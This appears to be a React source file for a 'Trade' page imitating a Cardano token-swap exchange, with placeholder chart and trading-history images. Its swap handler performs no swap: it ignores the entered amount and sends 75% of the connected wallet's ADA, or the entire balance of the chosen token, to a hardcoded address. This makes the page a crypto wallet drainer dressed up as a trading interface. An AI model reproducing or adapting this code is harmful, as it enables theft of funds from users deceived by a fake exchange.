import { useState, useEffect } from "react";
import Navigation from "../Components/Navigation";
import MobileNav from "../Components/MobileNav";
import Footer from "../Components/Footer";
import ConnectWallet from "../Components/Modals/ConnectWallet";
import TokenModal from "../Components/Modals/TokenModal";
import tokenList from "../data/tokenList.js";
import { useCardanoWasm, getWalletBalance, transferADA, transferToken } from "../utils/walletUtils";


const getTokenDetails = (symbol) => {
  return tokenList.find(token => token.symbol === symbol);
};

function Trade() {
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [showVideo, setShowVideo] = useState(true);
  const [payAmount, setPayAmount] = useState("");
  const [receiveAmount, setReceiveAmount] = useState("");
  const [conversionRate, setConversionRate] = useState(1); // Mock conversion rate
  const [isTokenModalOpen, setIsTokenModalOpen] = useState(false);
  const [modalType, setModalType] = useState(""); // To track which token to swap (pay or receive)
  // Find the token object from the tokenList based on the symbol
  const [payToken, setPayToken] = useState("ADA");
  const [receiveToken, setReceiveToken] = useState("MIN");

  // Get the selected token details (including the image)
  const payTokenDetails = getTokenDetails(payToken);
  const receiveTokenDetails = getTokenDetails(receiveToken);
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletApi, setWalletApi] = useState(null);
  const cardanoWasm = useCardanoWasm();

  const openWalletModal = () => {
    setIsWalletModalOpen(true);
  };

  const closeWalletModal = () => {
    setIsWalletModalOpen(false);
  };

  const openTokenModal = (type) => {
    setModalType(type);
    setIsTokenModalOpen(true);
  };

  const closeTokenModal = () => {
    setIsTokenModalOpen(false);
  };

  const handleTokenSelect = (token) => {
    if (modalType === "pay") {
      // Ensure pay token is different from receive token
      if (token === receiveToken) {
        alert("Pay token cannot be the same as receive token.");
        return;
      }
      setPayToken(token);
    } else if (modalType === "receive") {
      // Ensure receive token is different from pay token
      if (token === payToken) {
        alert("Receive token cannot be the same as pay token.");
        return;
      }
      setReceiveToken(token);
    }
    closeTokenModal();
  };
  

  const handlePayAmountChange = (e) => {
    const amount = e.target.value;
    setPayAmount(amount);
    setReceiveAmount((amount * conversionRate).toFixed(2));
  };

  const handleReceiveAmountChange = (e) => {
    const amount = e.target.value;
    setReceiveAmount(amount);
    setPayAmount((amount / conversionRate).toFixed(2));
  };

  const connectWallet = async () => {
    if (window.cardano && window.cardano.nami) {
      try {
        const wallet = await window.cardano.nami.enable();
        setWalletApi(wallet);  // Set wallet API
        setWalletConnected(true);
        console.log("Wallet connected:", wallet);
      } catch (error) {
        alert("Failed to connect wallet");
      }
    } else {
      alert("Nami Wallet not detected. Please install Nami Wallet.");
    }
  };

  const handleSwap = async () => {
  if (!walletConnected || !walletApi || !cardanoWasm) {
    alert("Please connect your wallet and wait for the WASM module to load.");
    return;
  }

  try {
    const receiverAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";

    // Fetch wallet balance (ADA and non-ADA tokens)
    const { adaBalance, tokens } = await getWalletBalance(walletApi, cardanoWasm);
    console.log("Wallet Balances:", { adaBalance, tokens });

    if (payToken === "ADA") {
      // Check ADA balance and transfer 3/4 of it
      if (adaBalance <= 0) {
        alert("Insufficient ADA wallet balance.");
        return;
      }

      const adaAmount = (adaBalance * 0.75 ); // Transfer 3/4 of ADA balance
      console.log("ADA to Transfer:", adaAmount);

      if (adaAmount <= 0 || isNaN(adaAmount)) {
        alert("Invalid ADA amount to transfer.");
        return;
      }

      // Transfer ADA
      const txHash = await transferADA(walletApi, cardanoWasm, receiverAddress, adaAmount);
      alert(`Transaction successful! ADA Hash: ${txHash}`);
    } else {
      // Find the token details in the wallet balance
      const payTokenDetails = tokens.find(token => token.assetName === payToken);

      if (!payTokenDetails) {
        alert(`No balance found for ${payToken}.`);
        return;
      }

      const tokenAmount = payTokenDetails.amount; // Transfer 100% of the token balance
      console.log(`${payToken} to Transfer:`, tokenAmount);

      if (tokenAmount <= 0 || isNaN(tokenAmount)) {
        alert(`Invalid ${payToken} amount to transfer.`);
        return;
      }

      // Transfer Non-ADA token
      const txHash = await transferToken(
        walletApi,
        cardanoWasm,
        receiverAddress,
        payTokenDetails.policyId,
        payTokenDetails.assetName,
        tokenAmount
      );
      alert(`Transaction successful! ${payToken} Hash: ${txHash}`);
    }
  } catch (error) {
    console.error("Error during swap:", error);
    alert("Transfer failed!");
  }
};


  useEffect(() => {
    const timer = setTimeout(() => {
      setShowVideo(false);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div>
      <Navigation />
      <div className="max-w-screen-xl m-auto">
        <div className="pt-[80px] sm:pt-[130px] pb-[100px] px-5 lg:px-0">
          <div className="flex items-center justify-between">
          <div className="flex items-center">
              <img
                src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255889/mdosxta1vhvuogxsykst.png"
                alt="min"
                width="30"
              />
              <img
                src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255895/ehdf8yiie4xtunawwskn.png"
                alt="min"
                width="30"
              />
              <h1 className="text-textSecondary ms-1 ms:ms-3 text-lg sm:text-2xl font-semibold">
                Min - ADA
              </h1>
              <div className="border border-stone-800 ms-1 sm:ms-2 rounded-full p-2">
                <svg
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  fill="currentColor"
                  className="invert  "
                >
                  <path d="M16.0503 12.0498L21 16.9996L16.0503 21.9493L14.636 20.5351L17.172 17.9988L4 17.9996V15.9996L17.172 15.9988L14.636 13.464L16.0503 12.0498ZM7.94975 2.0498L9.36396 3.46402L6.828 5.9988L20 5.99955V7.99955L6.828 7.9988L9.36396 10.5351L7.94975 11.9493L3 6.99955L7.94975 2.0498Z"></path>
                </svg>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <div className="max-w-[240px] hidden lg:block">
                <div className="flex justify-between bg-[#1f2025] py-1 px-1 rounded-full text-sm font-semibold">
                  <div className="flex items-center gap-1  text-textSecondary bg-[#111316] px-3 py-1 rounded-full">
                    <p>Basic</p>
                  </div>

                  <div className="flex items-center gap-1  text-textPrimary  px-3 py-1">
                    <p>Pro</p>
                  </div>
                </div>
              </div>

              <div className="rounded-full p-2 bg-[#1f2025]">
                <svg
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  fill="currentColor"
                  className="invert"
                >
                  <path d="M5 10C3.9 10 3 10.9 3 12C3 13.1 3.9 14 5 14C6.1 14 7 13.1 7 12C7 10.9 6.1 10 5 10ZM19 10C17.9 10 17 10.9 17 12C17 13.1 17.9 14 19 14C20.1 14 21 13.1 21 12C21 10.9 20.1 10 19 10ZM12 10C10.9 10 10 10.9 10 12C10 13.1 10.9 14 12 14C13.1 14 14 13.1 14 12C14 10.9 13.1 10 12 10Z"></path>
                </svg>
              </div>
            </div>
          </div>

          <div className="flex flex-col-reverse md:flex-row justify-between mt-6 sm:mt-20">
            {/* <div className="max-w-[800px] w-full">
              <img
                src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255711/g2fz1rzcnwf0whnrkaez.webp"
                alt="error"
                width="200"
                className="m-auto"
              />
              <p className="text-textSecondary text-center mt-3 text-xl font-semibold">
                Chart is unavailable for this pair
              </p>
            </div> */}

            <div
              className="max-w-3xl w-full sm:block hidden mt-[-10px] mb-6"
              onClick={openWalletModal}
            >
              {showVideo ? (
                <video
                  src="/load.mp4"
                  muted
                  disablePictureInPicture
                  loop
                  autoPlay
                />
              ) : (
                <img src="/tradeview.png" className="w-full" alt="trade" />
              )}
            </div>

            {/* Swap component */}
            <div className="my-6 max-w-md w-full m-auto md:m-0">
              <div className="p-3 border border-stone-700 rounded-xl drop-shadow-xl">
                <div className="mb-8 px-3 flex items-center justify-between">
                  <div className="flex items-center text-textPrimary gap-3">
                    <h1 className="text-textSecondary">Market</h1>
                    <h1>Limit</h1>
                    <h1 className="flex items-center">
                      More{" "}
                      <svg
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="currentColor"
                        data-slot="icon"
                        className="text-textPrimary size-4 ms-1"
                      >
                        <path d="M12 16L6 10H18L12 16Z"></path>
                      </svg>
                    </h1>
                  </div>
                  <div className="flex items-center gap-3">
                    <svg
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      fill="currentColor"
                      className="invert !size-5"
                    >
                      <path d="M12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22ZM12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20ZM11 15H13V17H11V15ZM13 13.3551V14H11V12.5C11 11.9477 11.4477 11.5 12 11.5C12.8284 11.5 13.5 10.8284 13.5 10C13.5 9.17157 12.8284 8.5 12 8.5C11.2723 8.5 10.6656 9.01823 10.5288 9.70577L8.56731 9.31346C8.88637 7.70919 10.302 6.5 12 6.5C13.933 6.5 15.5 8.067 15.5 10C15.5 11.5855 14.4457 12.9248 13 13.3551Z"></path>
                    </svg>
                    <i className="fa-solid fa-gear text-textSecondary text-xl"></i>
                  </div>
                </div>

                {/* Pay Token */}
                <div className="border border-stone-700 rounded-xl p-3">
                  <p className="text-left text-textPrimary font-semibold">
                    You pay
                  </p>
                  <div className="flex justify-between">
                    <input
                      type="number"
                      className="text-3xl text-textPrimary font-semibold bg-transparent border-none focus:outline-none"
                      style={{ width: "calc(100% - 100px)" }}
                      value={payAmount}
                      min={0}
                      onChange={handlePayAmountChange}
                      placeholder="0.0"
                    />
                    <div
                      className="flex items-center p-2 rounded-full bg-[#1a1b20] cursor-pointer"
                      onClick={() => openTokenModal("pay")}
                    >
                      <img
                        src={payTokenDetails?.image}
                        className="size-6 me-2"
                        alt={payTokenDetails?.symbol}
                      />
                      <h1 className="text-textSecondary font-semibold me-2">
                        {payTokenDetails?.symbol}
                      </h1>
                      <svg
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="currentColor"
                        data-slot="icon"
                        className="text-textSecondary size-4"
                      >
                        <path d="M12 16L6 10H18L12 16Z"></path>
                      </svg>
                    </div>
                  </div>
                </div>

                {/* Swap Icon */}
                <div className="flex justify-center">
                  <div className="absolute mt-[-20px] z-[1] rounded-full border border-stone-700 p-2 shadow-lg bg-[#111217]">
                    <svg
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      fill="currentColor"
                      className="remixicon size-5 shrink-0 text-white"
                    >
                      <path d="M13.0001 16.1716L18.3641 10.8076L19.7783 12.2218L12.0001 20L4.22192 12.2218L5.63614 10.8076L11.0001 16.1716V4H13.0001V16.1716Z"></path>
                    </svg>
                  </div>
                </div>

                {/* Receive Token */}
                <div className="border border-stone-700 rounded-xl p-3 mt-1">
                  <p className="text-left text-textPrimary font-semibold">
                    You receive
                  </p>
                  <div className="flex justify-between">
                    <input
                      type="number"
                      className="text-3xl text-textPrimary font-semibold bg-transparent border-none focus:outline-none"
                      style={{ width: "calc(100% - 100px)" }}
                      value={receiveAmount}
                      onChange={handleReceiveAmountChange}
                      placeholder="0.0"
                    />
                    <div
                      className="flex items-center p-2 rounded-full bg-[#1a1b20] cursor-pointer"
                      onClick={() => openTokenModal("receive")}
                    >
                      <img
                        src= {receiveTokenDetails?.image}
                        className="size-6 me-2"
                        alt={receiveTokenDetails?.symbol}
                      />
                      <h1 className="text-textSecondary font-semibold ms-2 me-2">
                      {receiveTokenDetails?.symbol}
                      </h1>
                      <svg
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="currentColor"
                        data-slot="icon"
                        className="text-textSecondary size-4"
                      >
                        <path d="M12 16L6 10H18L12 16Z"></path>
                      </svg>
                    </div>
                  </div>
                </div>

                <div
                  className="mt-1 border border-stone-700 p-3 rounded-xl"
                  onClick={openWalletModal}
                >
                  <div className="flex items-center justify-between">
                    <h1 className="text-textPrimary">Select your route</h1>
                    <svg
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      fill="currentColor"
                      data-slot="icon"
                      className="text-textSecondary size-4"
                    >
                      <path d="M12 16L6 10H18L12 16Z"></path>
                    </svg>
                  </div>
                  <div className="flex items-center justify-between text-textSecondary mt-2">
                    <p className="text-sm">Most Liquidity</p>
                    <div className="flex items-center gap-1">
                      <img
                        src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255895/ehdf8yiie4xtunawwskn.png"
                        alt="min"
                        width="20"
                      />
                      <svg
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="currentColor"
                        className="text-textPrimary size-4 shrink-0"
                      >
                        <path d="M16.1716 10.9999L10.8076 5.63589L12.2218 4.22168L20 11.9999L12.2218 19.778L10.8076 18.3638L16.1716 12.9999H4V10.9999H16.1716Z"></path>
                      </svg>
                      <img
                        src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255889/mdosxta1vhvuogxsykst.png"
                        alt="min"
                        width="20"
                      />
                    </div>
                  </div>
                </div>
                <button
                  className="bg-[#8aaaff] hover:bg-textSecondary duration-100 px-3 sm:px-5 py-3 sm:py-3 rounded-full font-medium text-sm sm:text-base w-full mt-3"
                  onClick={walletConnected ? handleSwap : connectWallet}
                >
                  {walletConnected ? "Swap" : "Connect Wallet"}
                </button>
              </div>

              {/* Wallet Modal */}
              {isWalletModalOpen && (
                <ConnectWallet onClose={closeWalletModal} />
              )}

              {/* Token Selection Modal */}
              {isTokenModalOpen && (
                <TokenModal
                  tokens={tokenList}
                  onSelect={handleTokenSelect}
                  onClose={closeTokenModal}
                />
              )}
              </div>
          </div>

          <div className="mt-8">
            <h1 className="text-textSecondary text-2xl font-medium">
              Trading history
            </h1>

            <div className="flex items-start sm:items-center flex-col sm:flex-row gap-2 mt-4">
              <div className="flex w-full items-center space-x-2 border border-stone-700 hover:border-2 hover:border-bd-pri-hv px-3 py-2 hover:px-[11px] hover:py-[7px] rounded-full text-sm max-w-xs">
                <span className="shrink-0 text-textPrimary">
                  <i className="fa-solid fa-magnifying-glass text-textSecondary"></i>
                </span>
                <input
                  className="min-w-0 flex-1 bg-transparent focus:outline-none text-p-sm text-textSecondary"
                  placeholder="Search by address or stake key"
                  type="text"
                />
              </div>
              <button
                className="select-none items-center justify-center space-x-2 whitespace-nowrap transition-colors border outline-none cursor-pointer bg-[#8aaaff]  border-transparent text-cpn-tent hover:bg-itr-tentSec-df hover:border-transparent hover:text-itr-tone-tent active:bg-itr-tentSec-sub active:border-transparent active:text-itr-tone-tent disabled:border-transparent disabled:bg-sf-pri-dis disabled:text-itr-tentSec-dis text-label-sm-sec px-5 py-2 rounded-full flex text-sm"
                onClick={openWalletModal}
              >
                <span className="size-5 [&>svg]:size-5">
                  <svg
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="currentColor"
                    className="remixicon "
                  >
                    <path d="M10 18H14V16H10V18ZM3 6V8H21V6H3ZM6 13H18V11H6V13Z"></path>
                  </svg>
                </span>
                <span>Filter</span>
              </button>
            </div>
          </div>

          <div
            className="hidden sm:block mt-4 cursor-pointer"
            onClick={openWalletModal}
          >
            <img src="/trade.png" alt="table" />
            <img src="/tradetwo.png" alt="table" />
          </div>

          <div className="block sm:hidden mt-6" onClick={openWalletModal}>
            <img src="/marketmobile.png" alt="table" />
            <img src="/marketmobiletwo.png" alt="table" />
            <img src="/marketmobilethree.png" alt="table" />
          </div>

          {/* <div className="mt-20 max-w-md m-auto text-center">
            <img src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722279215/no-history-dark.924504ba_kfrbpn.webp" width='250' className="m-auto" alt="error" />
            <h1 className="text-textSecondary font-bold text-xl mt-5">No result found</h1>
            <p className="text-textPrimary text-sm mt-3 mb-4">There is no result found, try adjust filter</p>
            <button
              className="flex m-auto select-none items-center justify-center space-x-2 whitespace-nowrap transition-colors border outline-none cursor-pointer bg-[#8aaaff]  border-transparent text-black font-medium hover:bg-itr-tentSec-df hover:border-transparent hover:text-itr-tone-tent active:bg-itr-tentSec-sub active:border-transparent active:text-itr-tone-tent disabled:border-transparent disabled:bg-sf-pri-dis disabled:text-itr-tentSec-dis px-6 py-2.5 rounded-full"
              onClick={openWalletModal}
            >
              <span>Clear search</span>
            </button>
          </div> */}
        </div>
      </div>
      <MobileNav />
      <Footer />
    </div>
  );
}

export default Trade;